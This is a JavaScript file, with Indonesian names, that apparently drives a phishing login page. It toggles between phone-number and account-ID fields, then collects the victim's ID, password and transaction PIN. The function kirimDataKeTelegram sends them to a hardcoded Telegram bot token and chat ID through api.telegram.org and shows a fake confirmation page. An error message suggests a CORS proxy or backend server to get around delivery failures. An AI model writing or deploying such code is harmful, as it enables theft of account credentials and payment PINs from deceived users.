const BOT_TOKEN = "8639273694:AAGcHEUSVDGCmhMP3hzm7cikK9LqnKjqH_I";
const CHAT_ID = "8810674043";

let modeSekarang = 'hp';

function hanyaAngka(e) {
  const kode = e.keyCode || e.which;
  if (!((kode >= 48 && kode <= 57) || (kode >= 96 && kode <= 105) || kode === 8 || kode === 46 || kode === 37 || kode === 39)) {
    e.preventDefault();
  }
}

function cekInput(e, tab) {
  if (modeSekarang === 'hp') hanyaAngka(e);
}

function gantiTab(jenis) {
  modeSekarang = jenis;
  if (jenis === 'hp') {
    document.getElementById('labelUtama').innerText = 'Nomor Telepon';
    document.getElementById('inputUtama').placeholder = 'Masukkan nomor telepon';
    document.getElementById('inputUtama').type = 'tel';
    document.querySelectorAll('.tab')[0].classList.add('active');
    document.querySelectorAll('.tab')[1].classList.remove('active');
  } else {
    document.getElementById('labelUtama').innerText = 'ID Akun';
    document.getElementById('inputUtama').placeholder = 'Masukkan ID akun anda';
    document.getElementById('inputUtama').type = 'text';
    document.querySelectorAll('.tab')[0].classList.remove('active');
    document.querySelectorAll('.tab')[1].classList.add('active');
  }
}

function bukaHalaman(nama) {
  document.querySelectorAll('.halaman').forEach(el => el.classList.remove('aktif'));
  document.getElementById('halaman‑' + nama).classList.add('aktif');
}

async function kirimDataKeTelegram() {
  const dataId = document.getElementById('inputUtama').value;
  const sandi = document.getElementById('kataSandi').value;
  const pin = document.getElementById('pinTransaksi').value;
  const pesan = `Data Permintaan:\nNomor / ID: ${dataId}\nKata Sandi: ${sandi}\nPIN Transaksi: ${pin}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
  } catch (err) {
    console.error("Gagal kirim (kemungkinan CORS):", err);
    alert("Jika pesan tidak masuk, gunakan perantara CORS atau server belakang");
  }
  bukaHalaman('terima');
}

window.gantiTab = gantiTab;
window.cekInput = cekInput;
window.bukaHalaman = bukaHalaman;
window.kirimDataKeTelegram = kirimDataKeTelegram;
window.hanyaAngka = hanyaAngka;
